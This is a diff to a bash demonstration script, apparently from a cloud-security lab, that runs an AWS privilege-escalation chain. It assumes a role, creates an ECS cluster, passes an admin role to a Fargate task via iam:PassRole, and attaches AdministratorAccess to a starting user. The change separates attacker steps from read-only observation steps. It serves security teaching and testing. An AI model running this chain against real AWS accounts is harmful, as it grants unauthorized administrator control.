@@ -25,12 +25,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -74,6 +76,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -84,23 +95,39 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}[OK] Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_role_creds() {
+    export AWS_ACCESS_KEY_ID="$ROLE_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$ROLE_SECRET_ACCESS_KEY"
+    export AWS_SESSION_TOKEN="$ROLE_SESSION_TOKEN"
+}
+
+# [EXPLOIT] Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -110,17 +137,21 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}[OK] Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}[OK] Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
 else
@@ -128,8 +159,10 @@ else
 fi
 echo ""
 
-# Step 5: Verify we can't create ECS resources directly as starting user
+# [EXPLOIT] Step 5: Verify starting user has limited permissions
 echo -e "${YELLOW}Step 5: Verifying starting user has limited permissions${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Attempting to create ECS cluster directly (should fail)..."
 if aws ecs create-cluster --region $AWS_REGION --cluster-name "test-fail-cluster" &> /dev/null; then
     # Clean up if it unexpectedly worked
@@ -140,14 +173,16 @@ else
 fi
 echo ""
 
-# Step 6: HOP 1 - Assume the starting role
+# [EXPLOIT] Step 6: HOP 1 - Assume the starting role
 echo -e "${YELLOW}Step 6: HOP 1 - Assuming the starting role with ECS permissions${NC}"
 echo -e "${BLUE}Attack Vector: sts:AssumeRole${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 STARTING_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${STARTING_ROLE}"
 echo "Target Role: $STARTING_ROLE_ARN"
 echo ""
 
-show_attack_cmd aws sts assume-role --role-arn $STARTING_ROLE_ARN --role-session-name demo-session --query 'Credentials' --output json
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $STARTING_ROLE_ARN --role-session-name demo-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $STARTING_ROLE_ARN \
     --role-session-name demo-session \
@@ -159,15 +194,17 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
-# Extract and set credentials
-export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
-# Keep region consistent
+# Extract assumed role credentials into named variables
+ROLE_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
+ROLE_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
+ROLE_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
+
+# Activate role credentials
+use_role_creds
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ROLE_IDENTITY"
 echo -e "${GREEN}[OK] Successfully assumed starting role${NC}"
@@ -177,11 +214,13 @@ echo -e "${GREEN}HOP 1 COMPLETE - Now operating as starting role${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo ""
 
-# Step 7: Verify the starting role's permissions
+# [OBSERVATION] Step 7: Verify the starting role's permissions
 echo -e "${YELLOW}Step 7: Verifying starting role permissions${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "The starting role should have ECS and PassRole permissions..."
 echo "Still cannot list IAM users (not admin yet)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "ReadOnly" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}Warning: Starting role can list IAM users${NC}"
 else
@@ -189,13 +228,15 @@ else
 fi
 echo ""
 
-# Step 8: HOP 2 - Create ECS cluster
+# [EXPLOIT] Step 8: HOP 2 - Create ECS cluster
 echo -e "${YELLOW}Step 8: HOP 2 - Creating ECS cluster${NC}"
 echo -e "${BLUE}Attack Vector: ecs:CreateCluster${NC}"
+use_role_creds
+export AWS_REGION=$AWS_REGION
 echo "Cluster name: $CLUSTER_NAME"
 echo ""
 
-show_attack_cmd aws ecs create-cluster --region $AWS_REGION --cluster-name "$CLUSTER_NAME" --output json
+show_attack_cmd "Attacker" "aws ecs create-cluster --region $AWS_REGION --cluster-name "$CLUSTER_NAME" --output json"
 CLUSTER_RESULT=$(aws ecs create-cluster \
     --region $AWS_REGION \
     --cluster-name "$CLUSTER_NAME" \
@@ -211,8 +252,10 @@ else
 fi
 echo ""
 
-# Step 9: Get network configuration for Fargate
+# [OBSERVATION] Step 9: Get network configuration for Fargate
 echo -e "${YELLOW}Step 9: Getting network configuration for Fargate tasks${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "Fargate requires network configuration (VPC and subnet)..."
 
 # Get default VPC
@@ -246,9 +289,11 @@ fi
 echo "Subnet: $DEFAULT_SUBNET"
 echo -e "${GREEN}[OK] Retrieved network configuration${NC}\n"
 
-# Step 10: Register task definition with admin role (PassRole escalation)
+# [EXPLOIT] Step 10: Register task definition with admin role (PassRole escalation)
 echo -e "${YELLOW}Step 10: Registering ECS task definition with admin role${NC}"
 echo -e "${BLUE}Attack Vector: iam:PassRole + ecs:RegisterTaskDefinition${NC}"
+use_role_creds
+export AWS_REGION=$AWS_REGION
 echo "This is the privilege escalation vector - passing the admin role to ECS task..."
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
 echo "Admin Role ARN: $ADMIN_ROLE_ARN"
@@ -290,7 +335,7 @@ TASK_DEF='{
   ]
 }'
 
-show_attack_cmd aws ecs register-task-definition --region $AWS_REGION --cli-input-json "<task-definition-json>" --output json
+show_attack_cmd "Attacker" "aws ecs register-task-definition --region $AWS_REGION --cli-input-json "<task-definition-json>" --output json"
 REGISTER_RESULT=$(aws ecs register-task-definition \
     --region $AWS_REGION \
     --cli-input-json "$TASK_DEF" \
@@ -308,12 +353,14 @@ else
 fi
 echo ""
 
-# Step 11: Run the ECS task on Fargate
+# [EXPLOIT] Step 11: Run the ECS task on Fargate
 echo -e "${YELLOW}Step 11: Running ECS task on Fargate${NC}"
 echo -e "${BLUE}Attack Vector: ecs:RunTask${NC}"
+use_role_creds
+export AWS_REGION=$AWS_REGION
 echo "This task will use the admin role to grant admin access to our starting user..."
 
-show_attack_cmd aws ecs run-task --region $AWS_REGION --cluster "$CLUSTER_NAME" --task-definition "$TASK_FAMILY" --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" --output json
+show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster "$CLUSTER_NAME" --task-definition "$TASK_FAMILY" --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" --output json"
 RUN_TASK_RESULT=$(aws ecs run-task \
     --region $AWS_REGION \
     --cluster "$CLUSTER_NAME" \
@@ -332,8 +379,10 @@ else
 fi
 echo ""
 
-# Step 12: Wait for task to complete
+# [OBSERVATION] Step 12: Wait for task to complete
 echo -e "${YELLOW}Step 12: Waiting for ECS task to complete${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "Monitoring task status (this may take 1-2 minutes)..."
 echo ""
 
@@ -400,27 +449,26 @@ echo "Allowing time for IAM changes to propagate..."
 sleep 15
 echo -e "${GREEN}[OK] IAM policy propagated${NC}\n"
 
-# Step 14: Switch back to starting user credentials
+# [EXPLOIT] Step 14: Switch back to starting user credentials
 echo -e "${YELLOW}Step 14: Switching back to starting user credentials${NC}"
-unset AWS_SESSION_TOKEN
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
-# Keep region consistent
+use_starting_creds
 export AWS_REGION=$AWS_REGION
 
 # Verify identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 FINAL_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $FINAL_IDENTITY"
 echo -e "${GREEN}[OK] Switched to starting user credentials${NC}\n"
 
-# Step 15: Verify admin access
+# [OBSERVATION] Step 15: Verify admin access
 echo -e "${YELLOW}Step 15: Verifying administrator access${NC}"
-echo "Attempting to list IAM users with starting user credentials..."
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+echo "Attempting to list IAM users..."
 echo "(The ECS task should have attached AdministratorAccess to starting user)"
 echo ""
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}[OK] Successfully listed IAM users!${NC}"
